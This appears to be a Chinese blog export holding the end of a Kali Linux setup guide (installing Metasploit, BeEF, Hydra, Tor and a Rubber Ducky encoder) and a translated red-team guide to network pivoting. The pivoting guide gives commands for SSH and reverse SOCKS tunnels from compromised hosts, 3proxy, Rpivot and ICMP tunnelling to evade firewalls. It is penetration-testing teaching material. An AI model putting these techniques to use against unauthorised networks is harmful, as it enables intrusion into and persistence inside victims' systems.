<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install tilix</span><br><span class="line"></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  libgtkd-3-0 libphobos2-ldc-shared78 libvted-3-0 tilix-common</span><br><span class="line">Suggested packages:</span><br><span class="line">  python-nautilus</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  libgtkd-3-0 libphobos2-ldc-shared78 libvted-3-0 tilix tilix-common</span><br><span class="line">0 upgraded, 5 newly installed, 0 to remove and 466 not upgraded.</span><br><span class="line">Need to get 10.7 MB of archives.</span><br><span class="line">After this operation, 49.1 MB of additional disk space will be used.</span><br><span class="line">Do you want to <span class="built_in">continue</span>? [Y/n] y</span><br></pre></td></tr></table></figure>

<p>亚马逊推荐：<a href="https://www.amazon.cn/dp/B00BQTWC0U">William E. Shotts Jr. 撰写的“Linux命令行大全”</a></p>
<h2 id="5、安装你喜爱的黑客工具"><a href="#5、安装你喜爱的黑客工具" class="headerlink" title="5、安装你喜爱的黑客工具"></a>5、安装你喜爱的黑客工具</h2><p>某些版本的 Kali 面向极简主义的渗透测试者，他们不希望预先安装数百个黑客工具。这意味着我们必须手动安装我们喜欢的工具。我们使用的工具类型根据我们的技能和专业领域而有所不同，但以下是一些流行的黑客工具。</p>
<ul>
<li><a href="https://www.aircrack-ng.org/">Aircrack-ng</a>：无线 <a href="https://null-byte.wonderhowto.com/how-to/hack-wi-fi-getting-started-with-aircrack-ng-suite-wi-fi-hacking-tools-0147893/">WEP/WPA 破解实用程序</a>。</li>
<li><a href="https://beefproject.com/">BeEF</a>：通过 Web 应用程序的浏览器<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-hack-web-browsers-with-beef-0159961/">漏洞利用框架</a>。</li>
<li><a href="https://portswigger.net/burp/">Burp Suite</a>：专为 <a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-hack-web-apps-part-4-hacking-form-authentication-with-burp-suite-0163642/">Web 应用程序安全性</a>而设计的图形应用。</li>
<li><a href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a>：登录<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/">密码暴力破解</a>实用程序。</li>
<li><a href="https://cirt.net/Nikto2">Nikto</a>：Web <a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-find-vulnerabilities-for-any-website-using-nikto-0151729/">服务器安全扫描器</a>。</li>
<li><a href="https://www.paterva.com/web7/">Maltego</a>：开源取证和情报收集。</li>
<li><a href="https://nmap.org/">Nmap</a>：端口扫描器和<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-advanced-nmap-for-reconnaissance-0151619/">网络映射器</a>。</li>
<li><a href="https://www.wireshark.org/download.html">Wireshark</a>：用于<a href="https://null-byte.wonderhowto.com/news/8-wireshark-filters-every-wiretapper-uses-spy-web-conversations-and-surfing-habits-0134508/">网络流量分析</a>的图形应用程序。</li>
</ul>
<p>可以使用以下命令安装这些工具。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install maltego metasploit-framework burpsuite wireshark aircrack-ng hydra nmap beef-xss nikto</span><br><span class="line"></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">hydra is already the newest version (8.6-1kali1).</span><br><span class="line"></span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  beef-xss binfmt-support burpsuite fastjar fonts-droid-fallback fonts-lato</span><br><span class="line">  fonts-noto-mono ghostscript gsfonts imagemagick imagemagick-6-common</span><br><span class="line">  imagemagick-6.q16 jarwrapper java-wrappers javascript-common libc-ares2</span><br><span class="line">  libcupsfilters1 libcupsimage2 libdjvulibre-text libdjvulibre21 libdouble-conversion1</span><br><span class="line">  libfftw3-double3 libgmp-dev libgmpxx4ldbl libgs9 libgs9-common libhttp-parser2.8</span><br><span class="line">  libijs-0.35 libilmbase23 libjbig2dec0 libjs-jquery libjs-jquery-easing</span><br><span class="line">  libjs-jquery-fancybox libjs-jquery-mousewheel libjs-jquery-ui libjs-source-map</span><br><span class="line">  libjs-uglify libjxr-tools libjxr0 liblqr-1-0 liblua5.2-0 libmagickcore-6.q16-6</span><br><span class="line">  libmagickcore-6.q16-6-extra libmagickwand-6.q16-6 libnetpbm10 libnl-route-3-200</span><br><span class="line">  libopenexr23 libpaper-utils libpaper1 libpcre2-16-0 libqt5core5a libqt5dbus5</span><br><span class="line">  libqt5gui5 libqt5multimedia5 libqt5multimedia5-plugins libqt5multimediagsttools5</span><br><span class="line">  libqt5multimediawidgets5 libqt5network5 libqt5opengl5 libqt5printsupport5 libqt5svg5</span><br><span class="line">  libqt5widgets5 libruby2.5 libsbc1 libsmi2ldbl libspandsp2 libssh-gcrypt-4 libuv1</span><br><span class="line">  libwhisker2-perl libwireshark-data libwireshark11 libwiretap8 libwmf0.2-7</span><br><span class="line">  libwscodecs2 libwsutil9 libxcb-icccm4 libxcb-image0 libxcb-keysyms1 libxcb-randr0</span><br><span class="line">  libxcb-render-util0 libxcb-xinerama0 libxcb-xkb1 libxkbcommon-x11-0 libyaml-0-2</span><br><span class="line">  maltego netpbm nikto nodejs nodejs-doc openjdk-8-jre openjdk-8-jre-headless</span><br><span class="line">  qt5-gtk-platformtheme qttranslations5-l10n rake ruby ruby-addressable ruby-ansi</span><br><span class="line">  ruby-atomic ruby-buftok ruby-celluloid ruby-celluloid-io ruby-daemons</span><br><span class="line">  ruby-dataobjects ruby-dataobjects-mysql ruby-dataobjects-postgres</span><br><span class="line">  ruby-dataobjects-sqlite3 ruby-dev ruby-did-you-mean ruby-diff-lcs ruby-dm-core</span><br><span class="line">  ruby-dm-do-adapter ruby-dm-migrations ruby-dm-serializer ruby-dm-sqlite-adapter</span><br><span class="line">  ruby-docile ruby-domain-name ruby-em-websocket ruby-equalizer ruby-erubis</span><br><span class="line">  ruby-eventmachine ruby-execjs ruby-faraday ruby-geoip ruby-hitimes ruby-http</span><br><span class="line">  ruby-http-cookie ruby-http-form-data ruby-http-parser.rb ruby-json ruby-librex</span><br><span class="line">  ruby-libv8 ruby-memoizable ruby-mime-types ruby-mime-types-data ruby-minitest</span><br><span class="line">  ruby-mojo-magick ruby-msfrpc-client ruby-msgpack ruby-multi-json ruby-multipart-post</span><br><span class="line">  ruby-naught ruby-net-telnet ruby-nio4r ruby-oj ruby-parseconfig ruby-power-assert</span><br><span class="line">  ruby-public-suffix ruby-qr4r ruby-rack ruby-rack-protection ruby-ref ruby-rqrcode</span><br><span class="line">  ruby-rspec-expectations ruby-rspec-support ruby-rubydns ruby-simple-oauth</span><br><span class="line">  ruby-simplecov ruby-simplecov-html ruby-sinatra ruby-sqlite3 ruby-term-ansicolor</span><br><span class="line">  ruby-test-unit ruby-therubyracer ruby-thread-safe ruby-tilt ruby-timers ruby-tins</span><br><span class="line">  ruby-twitter ruby-uglifier ruby-unf ruby-unf-ext ruby-xmlrpc ruby-zip ruby2.5</span><br><span class="line">  ruby2.5-dev ruby2.5-doc rubygems-integration thin wireshark wireshark-common</span><br><span class="line">  wireshark-qt zip</span><br><span class="line">The following packages will be upgraded:</span><br><span class="line">  aircrack-ng libcups2 libnl-3-200 libnl-genl-3-200 libxkbcommon0 metasploit-framework</span><br><span class="line">  nmap nmap-common</span><br><span class="line">8 upgraded, 182 newly installed, 0 to remove and 458 not upgraded.</span><br><span class="line">Need to get 381 MB of archives.</span><br><span class="line">After this operation, 616 MB of additional disk space will be used.</span><br><span class="line">Do you want to <span class="built_in">continue</span>? [Y/n] y</span><br></pre></td></tr></table></figure>

<h2 id="6、安装最新版本的-Tor"><a href="#6、安装最新版本的-Tor" class="headerlink" title="6、安装最新版本的 Tor"></a>6、安装最新版本的 Tor</h2><p>Tor 可以在 Kali 的存储库中使用，但匿名软件应该直接从源代码获取（torproject.org）。此外，Kali 的 Tor 版本无法可靠地维护或更新。这意味着我们可能会缺少关键的稳定性和安全性更新。</p>
<p>将 Tor 项目存储库添加到 APT 存储库列表中。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;deb https://deb.torproject.org/torproject.org stretch main</span></span><br><span class="line"><span class="string">deb-src https://deb.torproject.org/torproject.org stretch main&#x27;</span> &gt; /etc/apt/sources.list.d/tor.list</span><br></pre></td></tr></table></figure>

<p>然后，下载 <a href="https://www.torproject.org/docs/debian.html.en">Tor Project 包签名密钥</a>并将其导入 APT 密钥环。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget -O- https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">--2019-02-18 19:28:23--  https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc</span><br><span class="line">Resolving deb.torproject.org (deb.torproject.org)... 138.201.14.197</span><br><span class="line">Connecting to deb.torproject.org (deb.torproject.org)|138.201.14.197|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 19665 (19K) [text/plain]</span><br><span class="line">Saving to: ‘STDOUT’</span><br><span class="line"></span><br><span class="line">-                                              100%[=================================================================================================&gt;]  19.20K  47.5KB/s    <span class="keyword">in</span> 0.4s</span><br><span class="line"></span><br><span class="line">2019-02-18 19:28:25 (47.5 KB/s) - written to stdout [19665/19665]</span><br><span class="line"></span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>将签名密钥添加到密钥环后，您将看到“OK”输出。接下来，使用以下 apt-get 命令更新 APT。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">Hit:1 http://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid InRelease</span><br><span class="line">Get:2 https://deb.torproject.org/torproject.org stretch InRelease [4,965 B]</span><br><span class="line">Get:4 https://deb.torproject.org/torproject.org stretch/main Sources [1,169 B]</span><br><span class="line">Get:5 https://deb.torproject.org/torproject.org stretch/main amd64 Packages [2,400 B]</span><br><span class="line">Hit:3 http://archive-3.kali.org/kali kali-rolling InRelease</span><br><span class="line">Fetched 8,534 B <span class="keyword">in</span> 8s (1,091 B/s)</span><br><span class="line">Reading package lists... Done</span><br></pre></td></tr></table></figure>

<p>使用以下命令安装 Tor，你就完成了。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install tor deb.torproject.org-keyring</span><br><span class="line"></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">Suggested packages:</span><br><span class="line">  mixmaster torbrowser-launcher socat tor-arm apparmor-utils obfs4proxy</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  deb.torproject.org-keyring</span><br><span class="line">The following packages will be upgraded:</span><br><span class="line">  tor</span><br></pre></td></tr></table></figure>

<h2 id="7、使用-Syncthing-配置文件共享"><a href="#7、使用-Syncthing-配置文件共享" class="headerlink" title="7、使用 Syncthing 配置文件共享"></a>7、使用 Syncthing 配置文件共享</h2><p>由 <a href="https://twitter.com/jakobborg">Jakob Borg</a> 创建的 <a href="https://github.com/syncthing/syncthing">Syncthing</a> 是一种<a href="https://github.com/syncthing/syncthing/releases/">跨平台</a>，私有，轻量级文件同步（Dropbox）替代方案。作为渗透测试人员，在 <a href="https://null-byte.wonderhowto.com/how-to/white-hats-guide-choosing-virtual-private-server-0183135/">VPS</a> 和本地 Kali 机器之间传输按键日志，屏幕截图，网络摄像头录像和<a href="https://null-byte.wonderhowto.com/how-to/hacking-windows-10-capture-exfiltrate-screenshots-remotely-0183646/#jump-step4">敏感的战利品文件</a>可能是一项令人沮丧的任务。Syncthing 使安全的文件共享完全无痛。</p>
<p>我在前一篇文章中介绍了 <a href="https://null-byte.wonderhowto.com/how-to/securely-sync-files-between-two-machines-using-syncthing-0185999/">Syncthing 的安装和配置</a>。读者应参考该详细的分步指南。</p>
<h2 id="8、安装代码编辑器"><a href="#8、安装代码编辑器" class="headerlink" title="8、安装代码编辑器"></a>8、安装代码编辑器</h2><p><a href="https://atom.io/">Atom</a> 是一个免费的，开源的，功能丰富且高度可定制的文本编辑器。其功能包括实时协作共享代码，直观的编码自动补全功能，以及<a href="https://atom.io/packages">安装软件包</a>的能力，这些都进一步增强了 Atom 的多功能性。其他值得注意的文本编辑包括 <a href="https://wiki.geany.org/doku.php">Geany</a> 和 <a href="https://wiki.gnome.org/Apps/Gedit">Gedit</a>。</p>
<p>要安装 Atom，请访问他们的网站并下载最新的 <a href="https://atom.io/download/deb">Debian 安装程序</a>。接下来，使用下面的 apt-get 命令打开终端并安装所需的依赖项。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install gvfs gvfs-common gvfs-daemons gvfs-libs gconf-service gconf2 gconf2-common gvfs-bin psmisc</span><br><span class="line"></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">Correcting dependencies... Done</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">   gconf-service (3.2.6-4.1)</span><br><span class="line">   gconf2 (3.2.6-4.1)</span><br><span class="line">   gconf2-common (3.2.6-4.1)</span><br><span class="line">   gvfs-bin (1.36.2-1)</span><br><span class="line">   libgconf-2-4 (3.2.6-4.1)</span><br><span class="line">   psmisc (23.1-1+b1)</span><br><span class="line">The following packages will be upgraded:</span><br><span class="line">   gvfs (1.36.1-1 =&gt; 1.36.2-1)</span><br><span class="line">   gvfs-common (1.36.1-1 =&gt; 1.36.2-1)</span><br><span class="line">   gvfs-daemons (1.36.1-1 =&gt; 1.36.2-1)</span><br><span class="line">   gvfs-libs (1.36.1-1 =&gt; 1.36.2-1)</span><br><span class="line">4 upgraded, 6 newly installed, 0 to remove and 462 not upgraded.</span><br><span class="line">1 not fully installed or removed.</span><br><span class="line">Need to get 3,317 kB of archives.</span><br><span class="line">After this operation, 8,909 kB of additional disk space will be used.</span><br><span class="line">Do you want to <span class="built_in">continue</span>? [Y/n] y</span><br></pre></td></tr></table></figure>

<p>最后，使用命令行包管理器 <strong>dpkg</strong> 和 install（**-i**）参数。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dpkg -i ~/Downloads/atom-amd64.deb</span><br><span class="line"></span><br><span class="line">(Reading database ... 191882 files and directories currently installed.)</span><br><span class="line">Preparing to unpack atom-amd64.deb ...</span><br><span class="line">Unpacking atom (1.29.0) over (1.29.0) ...</span><br><span class="line">Setting up atom (1.29.0) ...</span><br><span class="line">Processing triggers <span class="keyword">for</span> desktop-file-utils (0.23-3) ...</span><br><span class="line">Processing triggers <span class="keyword">for</span> mime-support (3.60) ...</span><br></pre></td></tr></table></figure>

<p>完成后，Atom 将显示在“应用程序”菜单中。</p>
<p><img src="https://img.wonderhowto.com/img/original/05/68/63669459068404/0/636694590684040568.jpg" alt="Atom"></p>
<h2 id="9、克隆橡皮鸭（Rubber-Ducky）编码器"><a href="#9、克隆橡皮鸭（Rubber-Ducky）编码器" class="headerlink" title="9、克隆橡皮鸭（Rubber Ducky）编码器"></a>9、克隆橡皮鸭（Rubber Ducky）编码器</h2><p>USB 橡皮鸭是臭名昭著的按键注入工具。利用 <a href="https://ducktoolkit.com/">DuckToolKit 网站</a>可以很容易地创建 <a href="https://null-byte.wonderhowto.com/how-to/use-usb-rubber-ducky-disable-antivirus-software-install-ransomware-0180418/#jump-step2">ducky payloads</a>，但作为一个渗透测试人员，与随机网站共享客户信息是不安全的。将有效载荷内容上载到第三方网站可能很危险。</p>
<p>相反，我们可以使用 <strong>Git</strong> 克隆 USB 橡皮鸭<a href="https://github.com/hak5darren/USB-Rubber-Ducky">存储库</a>并在本地编码有效载荷。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hak5darren/USB-Rubber-Ducky</span><br><span class="line"></span><br><span class="line">Cloning into <span class="string">&#x27;USB-Rubber-Ducky&#x27;</span>...</span><br><span class="line">remote: Counting objects: 1657, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 1657 (delta 0), reused 0 (delta 0), pack-reused 1657</span><br><span class="line">Receiving objects: 100% (1657/1657), 31.88 MiB | 162.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (745/745), <span class="keyword">done</span>.</span><br><span class="line">Checking out files: 100% (1509/1509), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure>

<p>然后，将当前目录更改（<a href="https://null-byte.wonderhowto.com/how-to/hack-like-pro-linux-basics-for-aspiring-hacker-part-2-creating-directories-files-0147234/">cd</a>）为 <code>USB-Rubber-Ducky/Encoder/</code> 目录，并使用以下 <strong>java</strong> 命令开始编码没有第三方网站的 <a href="https://www.hak5.org/gear/duck/writing-your-first-usb-rubber-ducky-payload">ducky payloads</a>。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> USB-Rubber-Ducky/Encoder/</span><br><span class="line">java -jar encoder.jar -i input_payload.txt -o inject.bin</span><br></pre></td></tr></table></figure>

<h2 id="10、更改-SSH-密钥和默认密码"><a href="#10、更改-SSH-密钥和默认密码" class="headerlink" title="10、更改 SSH 密钥和默认密码"></a>10、更改 SSH 密钥和默认密码</h2><p>每个 Kali Linux 安装的默认密码都是相同的（toor），这使得自动化攻击非常容易。此外，当你通过 SSH 控制树莓派之类的东西时，默认的 SSH 密钥可以允许攻击者拦截你的通信。</p>
<p>要更改 SSH 密钥，请首先切换目录。执行以下两个命令将重置 SSH 密钥的默认值。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/ssh/</span><br><span class="line">dpkg-reconfigure openssh-server</span><br><span class="line"></span><br><span class="line">rescue-ssh.target is a disabled or a static unit, not starting it.</span><br></pre></td></tr></table></figure>

<p>现在，对于你的 Kali 系统密码，输入 <strong>passwd root</strong>，然后输入你的新密码。然后，重新输入以确认。如果你未以 root 用户身份登录，则可能会在执行此操作之前询问你当前的密码。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">passwd root</span><br><span class="line"></span><br><span class="line">Enter new UNIX password:</span><br><span class="line">Retype new UNIX password:</span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure>

<h2 id="安装-Kali-后你做的第一件事是什么？"><a href="#安装-Kali-后你做的第一件事是什么？" class="headerlink" title="安装 Kali 后你做的第一件事是什么？"></a>安装 Kali 后你做的第一件事是什么？</h2><p>我们都有不同程度的兴趣，技能和经验水平。这使得编写完整的安装后步骤列表变得棘手。我错过了任何关键步骤吗？你如何个性化和定制新安装的Kali？请务必在下面发表评论。</p>
]]></content>
      <categories>
        <category>Translation</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>一个红队成员的跳板（pivoting）指南</title>
    <url>/2017/12/10/pivoting-guide/</url>
    <content><![CDATA[<p>本文翻译自 <a href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/</a> ，正文如下：</p>
<hr>
<p>渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是 red team/pentest 参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。</p>
<a id="more"></a>

<h2 id="以公有-IP-为目标"><a href="#以公有-IP-为目标" class="headerlink" title="以公有 IP 为目标"></a>以公有 IP 为目标</h2><p>一个普遍的情况。比方说，你可以从互联网上找到一个网络应用程序中的 RCE 漏洞。你上传了一个 shell，并想把你的攻击发展到内部网络。请注意，在这种特定情况下，你应该能够绑定受感染主机上的端口，并且应该可以从外部网络访问这些端口。</p>
<h3 id="SSH-端口转发"><a href="#SSH-端口转发" class="headerlink" title="SSH 端口转发"></a>SSH 端口转发</h3><p>设法找到在主机上运行的 SSH 服务的凭据？很好！连接到主机，如下所示：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh username@host -D 1080</span><br></pre></td></tr></table></figure>

<p>这将在攻击者一侧产生一个 socks 服务器（ssh 客户端）。欢迎来到内部网络;）也可以将一个特定的端口转发给特定的主机。假设你需要访问主机 192.168.1.1 的内部网络中的 SMB 共享。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh username@host -L 445:192.168.1.1:445</span><br></pre></td></tr></table></figure>

<p>这样，端口 445 就会被打开在攻击者一侧。请注意，要绑定特权端口（例如 445），你将需要在你的计算机上拥有 root 权限。</p>
<h4 id="通过-SSH-的-VPN"><a href="#通过-SSH-的-VPN" class="headerlink" title="通过 SSH 的 VPN"></a>通过 SSH 的 VPN</h4><p>由于 openssh 4.3 版本，可以通过已建立的 ssh 通道来传输第 3 层网络流量。这比典型的 tcp 隧道有优势，因为你在控制 ip 流量。因此，例如，你可以使用 nmap 执行 SYN 扫描，并直接使用你的工具，而无需使用 <code>proxychains</code> 或其他代理工具。它是通过在客户端和服务器端创建 tun 设备并通过 ssh 连接在它们之间传输数据完成的。这很简单，但是由于 tun 设备的创建是一个特权操作，所以在两台机器上都需要 root。这些行应该出现在 <code>/etc/ssh/sshd_config</code> 文件（服务器端）中：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">PermitRootLogin yes</span><br><span class="line">PermitTunnel yes</span><br></pre></td></tr></table></figure>

<p>客户端上的以下命令将在客户端和服务器上创建一对 tun 设备：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh username@server -w any:any</span><br></pre></td></tr></table></figure>

<p>标志 <code>-w</code> 接受用冒号分隔的每一侧的 tun 设备的数量。可以显式设置 —— <code>-w 0:0</code>，也可以使用 <code>-w any:any</code> 语法来获取下一个可用的 tun 设备。<br>tun 设备之间的隧道已启用，但接口尚未配置。配置客户端的示例：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0</span><br></pre></td></tr></table></figure>

<p>服务器端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0</span><br></pre></td></tr></table></figure>

<p>在服务器上启用 IP 转发和 NAT：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE</span><br></pre></td></tr></table></figure>

<p>现在，你可以将对等主机 <code>1.1.1.1</code> 设置为你的默认网关，或通过它路由到特定的主机/网络：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">route add -net 10.0.0.0/16 gw 1.1.1.1</span><br></pre></td></tr></table></figure>

<p>在这个例子中，服务器的外部网络接口是 <code>eth0</code>，两端新创建的 tun 设备是 <code>tun0</code>。</p>
<h3 id="3proxy"><a href="#3proxy" class="headerlink" title="3proxy"></a>3proxy</h3><p>在这里获取 - <a href="https://github.com/z3APA3A/3proxy/releases">https://github.com/z3APA3A/3proxy/releases</a> 。这个工具适用于多个平台。有预编译的 Windows 二进制文件。至于 Linux，你将需要自己编译它，这是一个很简单的事，只是 <code>./configure &amp;&amp; make</code> :)这个工具是代理世界中的瑞士军刀，所以它有很多的功能。我通常使用它作为 socks 代理或端口转发。<br>这个工具从配置文件中获得所有选项。运行它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">3proxy.exe config_file</span><br></pre></td></tr></table></figure>

<p>或者如果你在 Linux 系统上：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./3proxy config_file</span><br></pre></td></tr></table></figure>

<p>要在端口 1080 上运行 3proxy 作为 socks5 代理，请在 config 中放置以下行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socks -p1080</span><br></pre></td></tr></table></figure>

<p>现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和/或基于 IP 的访问控制规则。去检查完整的手册在这里 - <a href="https://3proxy.ru/howtoe.asp">https://3proxy.ru/howtoe.asp</a> 。要对特定端口进行隧道使用，请用以下语法：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">tcppm &lt;localport&gt; &lt;targethost&gt; &lt;targetport&gt;</span><br></pre></td></tr></table></figure>

<h2 id="NAT-场景"><a href="#NAT-场景" class="headerlink" title="NAT 场景"></a>NAT 场景</h2><p>这是我在交战中遇到的最常见的情况。到目标的流量正在转发到逐个端口的基础上。这意味着除了端口转发规则以外的所有端口都不能从外部访问。一种可能的解决方案是启动反向连接。下面介绍的工具将帮助你做到这一点。</p>
<h3 id="SSH-反向端口转发-w-3proxy"><a href="#SSH-反向端口转发-w-3proxy" class="headerlink" title="SSH 反向端口转发/w 3proxy"></a>SSH 反向端口转发/w 3proxy</h3><p>这个跳板设置看起来像这样：<br>在目标服务器上使用以下配置运行 3proxy 服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">socks -p31337</span><br></pre></td></tr></table></figure>

<p>在接收方（攻击者的机器）上创建一个单独的用户。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">adduser sshproxy</span><br></pre></td></tr></table></figure>

<p>这个用户必须是低权限的，不应该有 shell 权限。毕竟，你不想被反向渗透，你呢？:)编辑 /etc/passwd 并将 shell 切换到 /bin/false。它应该是这样的：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/<span class="literal">false</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>现在使用 <code>-R</code> 标志连接到新创建的用户的服务器。Linux 系统：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh sshproxy@your_server -R 31337:127.0.0.1:31337</span><br></pre></td></tr></table></figure>

<p>对于 Windows，你将需要首先上传 <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">plink.exe</a>。这是一个 putty 的控制台版本。运行它：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337</span><br></pre></td></tr></table></figure>

<p><code>-R</code> 标志允许你绑定服务器端的端口。到此端口的所有连接都将被中继到客户端上的指定端口。这样我们就可以在客户端运行 3proxy socks 服务（受感染的机器）并通过 ssh<code>-R</code> 标志访问攻击者主机上的这个端口。</p>
<h3 id="Rpivot"><a href="#Rpivot" class="headerlink" title="Rpivot"></a>Rpivot</h3><p>这是我最喜欢穿越 NAT 连接的方法。<a href="https://github.com/artkond/rpivot">Rpivot</a> 是一个反向 socks 代理工具，可以让你通过 socks 代理隧道化流量。它连接回你的机器，并绑定一个 socks 代理。它的工作方式与 <code>ssh -D</code> 很像，但方向相反。服务器端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">python client.py --server-ip &lt;ip&gt; --server-port 9999</span><br></pre></td></tr></table></figure>

<p>结果，一个 socks4 代理服务将被绑定在服务器端的 1080 端口。</p>
<h2 id="从内部网络泄漏"><a href="#从内部网络泄漏" class="headerlink" title="从内部网络泄漏"></a>从内部网络泄漏</h2><p>这是另一种情况。比方说，你的社会工程学表演最终让你进入了内部网络。你的连接受限，并且能够在受感染的计算机上执行命令。当然，如果互联网直接路由，而不是用做防火墙，你可以凭借任何上述技术。但如果你不那么幸运，还是有办法把你的出路转出来。</p>
<h3 id="ICMP-隧道"><a href="#ICMP-隧道" class="headerlink" title="ICMP 隧道"></a>ICMP 隧道</h3><p>如果 icmp 流量被允许到外部网络，那么很可能你可以建立一个 icmp 隧道。缺点是你需要在目标系统上拥有 root/administrator 权限，因为有必要使用原始套接字。检查这个工具 - <a href="http://code.gerade.org/hans/">http://code.gerade.org/hans/</a> 。我个人从来没有尝试过在 Windows 上运行它。它在 Linux 上非常有效。服务器端命令（攻击者的机器）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./hans -v -f -s 1.1.1.1 -p P@ssw0rd</span><br></pre></td></tr></table></figure>

<p><code>-v</code> 标志是详细的，<code>-f</code> 标志在前台运行，<code>-s</code> 标志的值是服务器在新创建的 tun 接口上的 ip。<br>客户端：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./hans -f -c &lt;server_ip&gt; -p P@ssw0rd -v</span><br></pre></td></tr></table></figure>

<p>连接成功后，客户端应该可以直接在 1.1.1.100 处看到：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ping 1.1.1.100</span></span><br><span class="line">PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.</span><br><span class="line">64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms</span><br></pre></td></tr></table></figure>

<p>现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh/tsh /web shell）。</p>
